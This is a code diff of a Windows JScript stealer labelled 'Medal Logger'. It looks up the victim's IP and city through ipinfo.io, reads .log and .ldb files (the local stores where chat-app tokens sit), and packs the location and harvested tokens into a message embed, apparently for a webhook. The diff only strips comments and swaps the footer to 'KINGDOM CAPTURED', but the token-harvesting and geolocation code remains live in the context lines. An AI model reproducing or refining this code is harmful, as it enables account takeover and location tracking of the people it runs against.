@@ -35,7 +35,7 @@
                 var xhr = new ActiveXObject("MSXML2.XMLHTTP");
                 xhr.open("GET", "https://ipinfo.io/json", false);
                 xhr.send();
-                var data = eval('(' + xhr.responseText + ')'); // Using eval because JScript's JSON parsing is garbage.
+                var data = eval('(' + xhr.responseText + ')');
                 return {
                     ip: data.ip || "N/A",
                     city: data.city || "N/A",
@@ -80,7 +80,7 @@
                     var file = files.item();
                     if (file.Name.substr(file.Name.length - 4) === ".log" || file.Name.substr(file.Name.length - 4) === ".ldb") {
                         try {
-                            var stream = file.OpenAsTextStream(1, -2); // ForReading, SystemDefault
+                            var stream = file.OpenAsTextStream(1, -2);
                             var content = stream.ReadAll();
                             stream.Close();
                             
@@ -143,7 +143,7 @@
                     { name: "🗺️ Map View", value: gmapsLink !== "N/A" ? "[Click to View Approximate Location](" + gmapsLink + ")" : "Coordinates unavailable", inline: false}
                 ].concat(tokenFields),
                 footer: {
-                    text: "Medal Logger // MASTER KEY FORGED"
+                    text: "Medal Logger // KINGDOM CAPTURED"
                 }
             }]
         };
